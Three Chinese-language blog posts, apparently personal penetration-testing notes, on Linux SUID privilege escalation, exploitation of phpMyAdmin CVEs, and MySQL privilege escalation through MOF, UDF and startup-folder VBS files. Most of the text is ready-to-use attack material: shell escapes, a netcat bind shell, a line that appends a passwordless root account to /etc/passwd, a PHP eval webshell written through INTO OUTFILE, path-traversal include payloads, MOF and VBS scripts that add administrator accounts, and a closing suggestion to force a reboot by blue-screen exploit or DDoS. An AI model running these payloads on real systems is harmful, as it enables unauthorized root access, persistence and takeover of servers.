posts.title: LinuxжҸҗжқғ
posts.text: SUIDжҸҗжқғSUID GUID Stickybitsuid 4 , sgid 2 , Stickybit(зІҳж»һдҪҚ) 1 Umask: rootзҡ„umaskдёә0022 ,з¬¬дёҖдҪҚжҳҜдёҠдёҖжҺ’жҸҗеҲ°зҡ„, жүҖд»ҘеҲӣе»әж–Үд»¶ж—¶е°ұжҳҜ777-022=755, ж–Үд»¶е°ұжҳҜ 755-111=644 йҷӨеҺ»x(жү§иЎҢжқғ) Stickybit(зІҳж»һдҪҚ) дҝ®йҘ°ж–Үд»¶еӨ№ ж–Үд»¶еҸӘжңүиҮӘе·ұе’Ңrootз”ЁжҲ·еҸҜд»Ҙдҝ®ж”№ еҰӮ/tmpзӣ®еҪ• жүҖд»Ҙз”ЁжҲ·йғҪеҸҜеҲӣе»әдҝ®ж”№иҮӘе·ұж–Үд»¶, дҪҶж— жі•дҝ®ж”№е…¶д»–з”ЁжҲ·ж–Үд»¶(ж— и®әжҳҜеҗҰеҗҢдёҖдёӘз»„) SGID з”ЁдәҺзӣ®еҪ•пјҢеңЁиҜҘзӣ®еҪ•дёӢе»әз«Ӣзҡ„жүҖжңүж–Үд»¶е’Ңзӣ®еҪ•пјҢеұһз»„йғҪз»§жүҝиҜҘзӣ®еҪ•зҡ„еұһз»„пјҢдё”иҜҘз»„еҶ…е…¶д»–жҲҗе‘ҳдҝ®ж”№зӣ®еҪ•еҶ…зҡ„ж–Үд»¶ж—¶пјҢе…¶еұһдё»е’Ңеұһз»„йғҪдёҚж”№еҸҳ!! chmod g+s зӣ®еҪ• еҪ“дҝ®ж”№ж–Үд»¶дёӨдёӘз”ЁжҲ·жҳҜother(otherе’Ңз»„еҶ…жҲҗе‘ҳ)ж—¶дјҡж”№еҸҳжүҖеұһдё»(жүҖеұһз»„дёҚеҸҳ) suidжңүе•Ҙз”Ё? жҷ®йҖҡз”ЁжҲ·иҝһ/etc/shadowзҡ„жҹҘзңӢжқғйғҪжІЎжңү, дҪҶжҳҜиҰҒдҝ®ж”№еҜҶз ҒжҖҺд№ҲеҠһ, е°ұжҳҜеҲ©з”Ёpasswdзҡ„suid, и®©passwdд»Ҙrootиә«д»Ҫжү§иЎҢ иөӢдәҲsжқғйҷҗйңҖиҰҒжң¬иә«е…·жңүxжқғйҷҗ chmod 4755 еүҚйқўзҡ„4е°ұжҳҜSUID SUIDеҸӘеҜ№еҸҜжү§иЎҢж–Үд»¶жңүж•Ҳ и°ғз”ЁиҖ…еҜ№иҜҘж–Үд»¶жңүжү§иЎҢжқғ ж–Үд»¶жү§иЎҢиҝҮзЁӢдёӯ жӢҘжңүж–Үд»¶жүҖжңүиҖ…жқғйҷҗ, жқғйҷҗд»…еңЁжү§иЎҢиҝҮзЁӢдёӯжңүж•Ҳ дҫӢеӯҗ : иөӢдәҲfindж–Үд»¶sжқғйҷҗ sudo chmod u+s /usr/bin/find иөӢдәҲжӯӨжқғйҷҗйңҖиҰҒroot find passwd -exec cat /etc/shadow \; жҷ®йҖҡз”ЁжҲ·д№ҹеҸҜжҹҘзңӢ/etc/shadowж–Үд»¶дәҶ sudo chmod u-s /usr/bin/find еҺ»йҷӨsжқғйҷҗ find passwd -exec cat /etc/shadow \;жҸҗзӨәжқғйҷҗдёҚеӨҹдәҶ жүҫеҲ°SUIDж–Үд»¶find / -perm -u=s -type f 2>/dev/null find / -user root -perm -4000 -print 2>/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; -permз”Ёжі• find -perm mode(0777) дёҘж јеҢ№й…Қ, дёҚи¶іеүҚйқўиҮӘеҠЁж·»0 find -perm -mode(xxxx) е°Ҷж•°еӯ—иҪ¬жҚўдёәдәҢиҝӣеҲ¶, 1еҲҷеҝ…йЎ»еҢ№й…Қ,0еҲҷйҡҸж„Ҹ(ж»Ўи¶іиҰҒжұӮеҚіеҸҜ) find -perm +mode(xxxx) дёҺ-е·®еҲ«е°ұжҳҜеҸӘйңҖеҢ№й…ҚдёҖдёӘжқғйҷҗдҪҚзҡ„1еҚіеҸҜ(ж»Ўи¶іе…¶дёӯдёҖдёӘиҰҒжұӮеҚіеҸҜ) дёҖиҲ¬еҸҜд»ҘеҲ©з”Ёзҡ„ж–Үд»¶Nmap Vim find Bash More Less Nano cp git wget nampеңЁnamp 2.02иҮі5.21 жӢҘжңүдәӨдә’shell nmap -v namp --interactive ејҖеҗҜдәӨдә’жЁЎејҸ жҲ–иҖ…йҖҡиҝҮmetaaploitејҖеҗҜ exploit/unix/local/setuid_nmap е…¶д»–зүҲжң¬https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html еҲ©з”Ёnesи„ҡжң¬жү§иЎҢ еҲӣе»әдёҖдёӘnesи„ҡжң¬ a.nes os.execute("/bin/bash") жү§иЎҢ namp --script=a.nes дҪҶжҳҜеҸҜиғҪдёҚдјҡжҲҗеҠҹ ж–№жі•дәҢ a.nes local file = io.open("/etc/passwd", "a") file:write("root2::0:0::/root:/bin/bash\n") file:close() nmap --script=a.nes su root2 еҲҮжҚўеҲ°rootз”ЁжҲ·дәҶ vimvim.tiny /etc/shadow еҸҜд»ҘиҜ»еҸ–жүҖжңүж–Үд»¶ ејҖеҗҜshell vim.tiny # Press ESC key :set shell=/bin/sh :shell findfind passwd -exec '/bin/sh' \; жҲ–иҖ… find pentestlab -exec netcat -lvp з«ҜеҸЈ -e /bin/sh \; netcat ip з«ҜеҸЈ bashbash -p less/moreless /etc/passwd(/etc/shadow) иҝӣе…ҘеҗҺиҫ“е…Ҙ !/bin/sh gitgit help config жҲ–иҖ…git -p help иҫ“е…Ҙ!/bin/shжҲ–иҖ…!/bin/bash wgetеҲ©з”ЁwgetдёӢиҪҪж·»еҠ жңүиҮӘе®ҡд№үrootиҙҰжҲ·зҡ„passwdж–Үд»¶еҲ°/etc/passwd е…¶д»–https://gtfobins.github.io/#+suid еҸ—йҷҗshellзӘҒз ҙhttps://www.freebuf.com/articles/system/188989.html /зӣҙжҺҘеҲ©з”Ё /bin/sh /bin/bash /bin/dash cpе°Ҷshellж–Үд»¶з§»еҲ°з”ЁжҲ·зӣ®еҪ•з„¶еҗҺжү§иЎҢ cp /bin/bash ubash cp /bin/sh ush ftp gdb man git vim/vi more/lessftp ftp > !/bin/bash gdb gdb > !/bin/sh man ls !/bin/sh git help status !/bin/sh vim/vi :!/bin/sh more/less !'sh' pinfopinfo ls ! жү§иЎҢе‘Ҫд»Ө set shellжҹҘзңӢзҺҜеўғеҸҳйҮҸ export -p еҰӮжһңдёә-rxеҲҷжҲ‘д»¬ж— жі•еҶҷе…Ҙ еңЁvim/viдёӯи®ҫзҪ®shell :set shell=/bin/sh :shell жҲ–иҖ…еңЁзҺ°жңүshellдҝ®ж”№зҺҜеўғеҸҳйҮҸ export PATH=$PATH:/bin зј–зЁӢиҜӯиЁҖжҸҗжқғpython python -c 'import os;os.system("/bin/sh")' phpпјҡ php -a then exec("sh -i"); perlпјҡ perl -e 'exec "/bin/sh";' luaпјҡ os.execute('/bin/sh'). rubyпјҡ exec "/bin/sh"

posts.title: phpmyadminжјҸжҙһеҲ©з”Ё
posts.text: phpmyadminжјҸжҙһеҲ©з”ЁиҺ·еҸ–зүҲжң¬дҝЎжҒҜи®ҝй—® readme.php README changelog.php Change Documetation.html Documetation.txt translators.html getshell дҪҝз”ЁзҲҶз ҙе·Ҙе…· , жҲ–иҖ…еҫ—еҲ°иҙҰеҸ·еҜҶз Ғ зӣҙжҺҘзҷ»еҪ• еҶҷе…Ҙж–Үд»¶жқЎд»¶ жӢҘжңүrootжқғйҷҗ зҪ‘з«ҷи·Ҝеҫ„ жӢҘжңүеҶҷжқғйҷҗ иҺ·еҸ–и·Ҝеҫ„ж–№жі• phpinfo жҹҗдәӣзҪ‘з«ҷе®үиЈ…е®ҢжҲҗеҗҺ жөӢиҜ•ж–Үд»¶еҸҜиғҪжІЎжңүеҲ йҷӨ phpinfo.phpгҖҒinfo.phpгҖҒ1.phpгҖҒtest.php жҹҘеҜ»mysqlи·Ҝеҫ„зҢңжөӢwebи·Ҝеҫ„ select @@datadir as dataPath from dual ; жҲ–иҖ… show variables Like '%datadir%'; load_fileиҜ»еҸ–зҪ‘з«ҷй…ҚзҪ®ж–Үд»¶ index.php жҲ–иҖ… /etc/passwdзӯүзӯү жҹҘиҜўеҶҷжқғйҷҗ SHOW VARIABLES LIKE 'secure_file_priv' secure_file_privдҪңз”Ё 1. йҷҗеҲ¶load data, select ... outfile, load_file()зӯү 2. еҖјдёәnullж—¶ , иЎЁзӨәйҷҗеҲ¶mysqlдёәдёҚе…Ғи®ёеҜје…ҘеҜјеҮә 3. еҖјдёә/tmp/ж—¶ , иЎЁзӨәеҜје…Ҙ еҜјеҮәеҸӘеңЁ/tmpзӣ®еҪ•дёӢ 4. жІЎжңүеҖјж—¶иЎЁзӨәдёҚйҷҗеҲ¶ еҶҷдёҖеҸҘиҜқ select "<?php @eval($_POST[123]);?>" into outfile "\\xx\\xx\\xxx.php" еҲ©з”Ёж—Ҙеҝ—getshell ејҖеҗҜж—Ҙеҝ— жҹҘзңӢж—Ҙеҝ—жҳҜеҗҰејҖеҗҜ SHOW VARIABLES LIKE 'general_log%' ејҖеҗҜж—Ҙеҝ— ејҖеҗҜж—Ҙеҝ— set global general_log='on'; дҝ®ж”№ж—Ҙеҝ—и·Ҝеҫ„ set global general_log_file="xx\\xx\\xx\\xx.php"; жҹҘзңӢејҖеҗҜжғ…еҶө SHOW VARIABLES LIKE "general_log%"; еҶҷе…Ҙshell д»»ж„Ҹжү§иЎҢsqlиҜӯеҸҘ cve-2018-12613еҗҺеҸ°ж–Үд»¶еҢ…еҗ«зүҲжң¬4.8.0е’Ң4.8.1 жјҸжҙһеҲҶжһҗ index.php 55-63иЎҢ if (! empty($_REQUEST['target']) && is_string($_REQUEST['target']) && ! preg_match('/^index/', $_REQUEST['target']) && ! in_array($_REQUEST['target'], $target_blacklist) && Core::checkPageValidity($_REQUEST['target']) ) { include $_REQUEST['target']; exit; } 1. еӯҳеңЁtargetеҸӮж•° 2. еҸӮж•°дёәеӯ—з¬ҰдёІ 3. дёҚиғҪд»ҘindexејҖеӨҙ 4. targetйҮҢдёҚиғҪеҗ«жңүй»‘еҗҚеҚ•еӯ—з¬Ұ 5. иҝӣиЎҢcheckPageValidity()еҮҪж•°жЈҖжҹҘ $target_blacklist index.php 50-52иЎҢ $target_blacklist = array ( 'import.php', 'export.php' ); checkPageValidity()еҮҪж•° Core.php 443-476иЎҢ public static function checkPageValidity(&$page, array $whitelist = []) { if (empty($whitelist)) { $whitelist = self::$goto_whitelist; } //$whitelistеҸҳйҮҸжҳҜеҗҰдёәз©ә , дёәз©әе°ұиөӢеҖјдёәself::$goto_whitelist; if (! isset($page) || !is_string($page)) { return false; } //еҸҳйҮҸжҳҜеҗҰи®ҫзҪ®дё”дёҚдёәз©әжҲ–иҖ…дёҚжҳҜеӯ—з¬ҰдёІ if (in_array($page, $whitelist)) { return true; } //$pageдёӯжҳҜеҗҰеӯҳеңЁ$whitelistдёӯзҡ„еҖј $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); //жҲӘеҸ–?д№Ӣй—ҙзҡ„еӯ—з¬ҰдёІ if (in_array($_page, $whitelist)) { return true; } //жҳҜеҗҰеӯҳеңЁ$whitelistдёӯзҡ„еҖј $_page = urldecode($page); //иҝӣиЎҢurldecodeи§Јз Ғ $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); //жҲӘеҸ–?д№Ӣй—ҙзҡ„еҖј if (in_array($_page, $whitelist)) { return true; } //жҳҜеҗҰеӯҳеңЁ$whitelistдёӯзҡ„еҖј return false; } еҺҹж„ҸжҳҜеҪ“targetеҖјеёҰжңүеҸӮж•°ж—¶иғҪеӨҹжӯЈзЎ®еҢ…еҗ« , дҪҶжҳҜеҪ“дј жңү?жҲ–иҖ…%3fжҲ–иҖ…%253fе’ҢеүҚйқўзҡ„еӯ—з¬ҰдёІеңЁ$whitelistйҮҢйқўж—¶йғҪдјҡдҪҝе…¶з»•иҝҮжЈҖжҹҘ вҖӢ $whitelist public static $goto_whitelist = array( 'db_datadict.php', 'db_sql.php', 'db_events.php', 'db_export.php', 'db_importdocsql.php', 'db_multi_table_query.php', 'db_structure.php', 'db_import.php', 'db_operations.php', 'db_search.php', 'db_routines.php', 'export.php', 'import.php', 'index.php', 'pdf_pages.php', 'pdf_schema.php', 'server_binlog.php', 'server_collations.php', 'server_databases.php', 'server_engines.php', 'server_export.php', 'server_import.php', 'server_privileges.php', 'server_sql.php', 'server_status.php', 'server_status_advisor.php', 'server_status_monitor.php', 'server_status_queries.php', 'server_status_variables.php', 'server_variables.php', 'sql.php', 'tbl_addfield.php', 'tbl_change.php', 'tbl_create.php', 'tbl_import.php', 'tbl_indexes.php', 'tbl_sql.php', 'tbl_export.php', 'tbl_operations.php', 'tbl_structure.php', 'tbl_relation.php', 'tbl_replace.php', 'tbl_row_action.php', 'tbl_select.php', 'tbl_zoom_select.php', 'transformation_overview.php', 'transformation_wrapper.php', 'user_password.php', ); иҰҒеҲ©з”Ёзҡ„е°ұжҳҜindex.phpдёӯзҡ„includeеҮҪж•° , еҲҷйңҖиҰҒcheckPageValidity()еҮҪж•°иҝ”true payload ?target=db_datadict.php?/../../../../../../../../etc/passwd ?target=db_datadict.php%3f/../../../../../../../../etc/passwd ?target=db_datadict.php%253f/../../../../../../../../etc/passwd иҝҷдәӣйғҪеҸҜд»Ҙз»•иҝҮ еҲ©з”Ёж–№жі• еҢ…еҗ«ж•Ҹж„ҹж–Үд»¶ еҢ…еҗ«дёҠдј ж–Үд»¶ ејҖеҗҜе№¶еҢ…еҗ«ж—Ҙеҝ— еҢ…еҗ«phpsessionж–Үд»¶ е…Ҳжү§иЎҢдёҖеҸҘsqlиҜӯеҸҘ select '<?php phpinfo();?>'; еҢ…еҗ«?target=db_datadict.php%253f/../../../tmp/tmp/sess_xxxxx phpsessionж–Үд»¶еҗҚеңЁcookieдёӯжүҫеҲ° CVE-2016-5734 RCEеҪұе“ҚзүҲжң¬ phpmyadmin4.3.0-4.6.2 PHP 4.3.0-5.4.6 жјҸжҙһеҺҹеӣ  еңЁphp5.4.7д»ҘеүҚ , preg_replaceеҮҪж•°жңүжјҸжҙһ , еҸҜд»Ҙ/0иҝӣиЎҢжҲӘж–ӯ,е°ҶжӯЈеҲҷдҝ®ж”№дёә/eжЁЎејҸ,д»ҺиҖҢжү§иЎҢе‘Ҫд»Ө дҪҝз”Ёи„ҡжң¬ж”»еҮ» searchsploit phpmyadmin python3 40185.py -u root - root -d test -c "system(whoami)" http://ip:port/ CVE-2018-19968 еҸӮиҖғ: https://xz.aliyun.com/t/3634 еҪұе“ҚзүҲжң¬: phpMyAdmin 4.8.0~4.8.3 еҺҹеӣ  TransformationжҳҜphpMyAdminдёӯзҡ„дёҖдёӘй«ҳзә§еҠҹиғҪпјҢйҖҡиҝҮTransformationеҸҜд»ҘеҜ№жҜҸдёӘеӯ—ж®өзҡ„еҶ…е®№дҪҝз”ЁдёҚеҗҢзҡ„иҪ¬жҚўпјҢжҜҸдёӘеӯ—ж®өдёӯзҡ„еҶ…е®№е°Ҷиў«йў„е®ҡд№үзҡ„и§„еҲҷжүҖиҪ¬жҚўгҖӮжҜ”еҰӮжҲ‘д»¬жңүдёҖдёӘеӯҳжңүж–Үд»¶еҗҚзҡ„еӯ—ж®ө вҖҳFilenameвҖҷпјҢжӯЈеёёжғ…еҶөдёӢ phpMyAdmin еҸӘдјҡе°Ҷи·Ҝеҫ„жҳҫзӨәеҮәжқҘгҖӮдҪҶжҳҜйҖҡиҝҮTransformationжҲ‘д»¬еҸҜд»Ҙе°ҶиҜҘеӯ—ж®өиҪ¬жҚўжҲҗи¶…й“ҫжҺҘпјҢжҲ‘д»¬е°ұиғҪзӣҙжҺҘеңЁ phpMyAdmin дёӯзӮ№еҮ»е№¶еңЁжөҸи§ҲеҷЁзҡ„ж–°зӘ—еҸЈдёӯзңӢеҲ°иҝҷдёӘж–Үд»¶гҖӮ йҖҡеёёжғ…еҶөдёӢTransformationзҡ„и§„еҲҷеӯҳеӮЁеңЁжҜҸдёӘж•°жҚ®еә“зҡ„pma__column_infoиЎЁдёӯпјҢиҖҢеңЁphpMyAdmin 4.8.0~4.8.3зүҲжң¬дёӯпјҢз”ұдәҺеҜ№иҪ¬жҚўеҸӮж•°еӨ„зҗҶдёҚеҪ“пјҢеҜјиҮҙдәҶд»»ж„Ҹж–Үд»¶еҢ…еҗ«жјҸжҙһзҡ„еҮәзҺ°гҖӮ еҲ©з”Ё зҷ»еҪ•еҗҺеҸ°еҗҺеҲӣе»әж•°жҚ®еә“ CREATE DATABASE test111; CREATE TABLE test111.test1111 ( baz VARCHAR(100) PRIMARY KEY ); INSERT INTO test111.test1111 SELECT '<?php phpinfo(); ?>'; и®ҝй—®http://target/com/chk_rel.php?fixall_pmadb=1&db=test111 жҸ’е…Ҙж•°жҚ® , жү§иЎҢ INSERT INTO pma__column_info SELECT '1', 'test111', 'test1111', 'baz', 'plop', 'plop', 'plop', 'plop', '../../../../../../../../tmp/sess_9r15lk5a27asrbb6hl8hffv6cp','plop'; xxxжҚўжҲҗcookieдёӯзҡ„phpmyadminеҖј и®ҝй—®/tbl_replace.php?db=test111&table=test1111&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1

posts.title: MYSQLжҸҗжқғеӨҚзҺ°
posts.text:
[toc] mysqlеҶҷжқғйҷҗ жҹҘиҜўеҶҷжқғйҷҗ show variables like "secure_file_priv"; жҹҘиҜўз»“жһңдёҚиғҪдёәnull дҝ®ж”№й…ҚзҪ®ж–Үд»¶ windowsдёӢдёәmy.ini linuxдёәmy.cnf secure_file_priv =вҖҷвҖҷ nullдёәдёҚе…Ғи®ёеҜје…ҘеҜјеҮә з©әзҷҪеҲҷдёәд»»ж„Ҹ /tmpеҲҷдёәеҸӘиғҪеңЁ/tmpзӣ®еҪ•дёӢ жҹҘзңӢmysql pulginж–Үд»¶зӣ®еҪ• show variables like "pulgin%"; жҹҘзңӢзі»з»ҹзүҲжң¬ show variables like "%compile%"; mofжҸҗжқғ(еӨұиҙҘ) еңЁwindowsзҡ„C:/windows/system32/wbem/mof/nullevt.mofж–Үд»¶дёӯ, дјҡй—ҙжҺҘд»Ҙзі»з»ҹжқғйҷҗжү§иЎҢдёҖж¬Ў, еҶҷе…ҘжҲ‘д»¬зҡ„жҒ¶ж„Ҹд»Јз ҒеҚіеҸҜиў«зі»з»ҹжү§иЎҢ select load_file("дёҠдј ж–Үд»¶зҡ„и·Ҝеҫ„/evil.mof") into dumpfile "C:/windows/system32/wbem/mof/nullevt.mof" mofж–Үд»¶ ж·»еҠ з”ЁжҲ· instanbce of ActiveScriptEventConsumer as $Consumer { Name = "consPCSV2"; ScriptingEngine = "JScript"; ScripptText = "var WSH = new ActiveXObject(\"WScript.shell\")
WSH.run(\"net.exe user admin admin /add\")"; }; жҸҗжқғ instanbce of ActiveScriptEventConsumer as $Consumer { Name = "consPCSV2"; ScriptingEngine = "JScript"; ScripptText = "var WSH = new ActiveXObject(\"WScript.shell\")
WSH.run(\"net localgroup administrators admin /add\")"; }; е®Ңж•ҙд»Јз Ғ еӨҚеҲ¶д»Јз Ғ #pragma namespace("\\.\root\subscription") instance of __EventFilter as $EventFilter { EventNamespace = "Root\Cimv2"; Name = "filtP2"; Query = "Select * From __InstanceModificationEvent " "Where TargetInstance Isa \"Win32_LocalTime\" " "And TargetInstance.Second = 5"; QueryLanguage = "WQL"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = "consPCSV2"; ScriptingEngine = "JScript"; ScriptText = "var WSH = new ActiveXObject(\"WScript.Shell\")
WSH.run(\"net.exe user admin admin /add\")"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; udfжҸҗжқғ йҖҡиҝҮж·»еҠ еҜ№еә”зҡ„иҮӘе®ҡд№үеҮҪж•°ж–Үд»¶ е®һзҺ°жҸҗжқғ mysqlзүҲжң¬еӨ§дәҺ5.1зүҲжң¬. udf.dllж–Үд»¶еҝ…йЎ»ж”ҫзҪ®дәҺMYSQLе®үиЈ…зӣ®еҪ•дёӢзҡ„lib\pluginж–Үд»¶еӨ№дёӢгҖӮ mysqlзүҲжң¬е°ҸдәҺ5.1зүҲжң¬. udf.dllж–Үд»¶еңЁWindows2003дёӢж”ҫзҪ®дәҺc:\windows\system32пјҢеңЁwindows2000дёӢж”ҫзҪ®дәҺc:\winnt\system32гҖӮ е…Ҳе°ҶsqlmapиҮӘеёҰзҡ„udfж–Үд»¶иҪ¬дёәudf.dllж–Үд»¶(linuxдёә.soж–Үд»¶), еңЁsqlmapдёӢзҡ„sqlmap\extra\cloak\cloak.pyж–Үд»¶ python cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_ еңЁmysqlе®үиЈ…зӣ®еҪ•дёӢеӯҳеңЁlib/pluginзӣ®еҪ• е№¶дё”еӯҳеңЁ, е°Ҷsqlmapз”ҹжҲҗзҡ„udfж–Үд»¶з§»еҠЁеҲ°mysqlеҜ№еә”зӣ®еҪ•дёӢ жҲ–иҖ…е°Ҷж–Үд»¶иҪ¬дёә16иҝӣеҲ¶ з„¶еҗҺи§Јз Ғеӯҳе…Ҙж–Үд»¶ select unhex("xxxxx16иҝӣеҲ¶еӯ—з¬Ұ") into dumpfile "pulginи·Ҝеҫ„/udf.dll" еңЁmysqlдёӯеј•е…Ҙudfж–Үд»¶ create function sys_eval returns string soname 'udf.dll'; жү§иЎҢеҮҪж•° select sys_eval("whoami"); еҲӣе»әз”ЁжҲ· net user test root /add/ rootжҳҜеҜҶз Ғ net localgroup administrators test /add еҲ йҷӨеҮҪж•° drop function sys_eval; delect from mysql.func where name="sys_eval"; vbsжҸҗжқғ е°Ҷvbsж–Үд»¶ж”ҫе…Ҙwindowзҡ„C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartupдёӢ еңЁwindowsеҗҜеҠЁж—¶е°ұдјҡиҮӘеҠЁжү§иЎҢ bbsж–Үд»¶ еҲӣе»әtestз”ЁжҲ· set sh=wscript.createobject("wscript.shell") sh.run "net user test11 qwe123! /add" еҜје…Ҙж–Үд»¶еӨ№ жіЁж„Ҹи·Ҝеҫ„еҲҶеүІз¬Ұ select load_file("C:/дёҠдј зҡ„vbsж–Үд»¶/") into dumpfile "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/1.vbs" иҝ«дҪҝжңҚеҠЎеҷЁйҮҚеҗҜ и“қеұҸexp ddosж”»еҮ»
